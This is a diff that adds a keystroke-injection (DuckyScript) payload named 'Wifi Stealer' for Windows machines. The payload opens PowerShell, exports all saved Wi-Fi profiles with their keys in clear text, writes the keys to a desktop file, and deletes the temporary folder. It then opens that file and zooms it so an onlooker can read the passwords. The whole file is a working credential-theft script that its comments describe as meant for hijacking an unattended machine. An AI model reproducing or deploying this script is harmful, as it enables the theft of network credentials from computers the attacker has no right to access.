@@ -1,0 +1,36 @@
+REM Title: Wifi Stealer
+REM Author: 7h30th3r0n3
+REM Reworked: the0bone
+REM Target:  Windows 7/8/10/11 
+REM Version: 1.2
+REM Category: Grabber
+REM Extracts the SSID and wifi shared key and puts them in a txt file named 0.txt on the desktop
+REM Designed to be used for mouse hijacking on a machine whose screen is visible
+GUI r
+DELAY 500
+STRING powershell 
+ENTER
+DELAY 2000
+REM setting variable
+STRING $desktop = ([Environment]::GetFolderPath("Desktop"))
+ENTER
+REM Creating a new folder in Temp with random name to store the xml files and create single text file.
+STRING New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"; Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial'> $desktop\0.txt; Set-Location -Path "$env:temp"; Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse; exit
+ENTER
+DELAY 4000
+GUI m
+DELAY 2000
+STRING 0
+DELAY 100
+ENTER
+DELAY 200
+GUI UPARROW
+DELAY 100
+CTRL =
+CTRL =
+CTRL =
+CTRL =
+CTRL =
+DELAY 10000
+ALT F4
+CTRL D
